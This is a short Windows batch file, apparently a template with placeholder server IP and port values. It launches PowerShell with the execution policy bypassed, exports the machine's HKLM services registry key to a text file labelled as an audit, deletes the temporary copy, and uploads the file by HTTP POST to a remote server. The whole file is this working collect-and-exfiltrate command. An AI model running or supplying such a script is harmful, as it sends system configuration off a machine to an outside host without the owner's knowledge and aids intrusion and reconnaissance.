@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "reg export HKLM\SYSTEM\CurrentControlSet\Services C:\t.reg /y; Get-Content C:\t.reg | Out-File C:\audit_services.txt -Encoding ascii; rm C:\t.reg; Invoke-WebRequest -Uri \"http://{{SERVER_IP}}:{{UPLOAD_PORT}}\" -Method POST -InFile C:\audit_services.txt -Headers @{\"X-Filename\"=\"audit_services.txt\"} -UseBasicParsing"
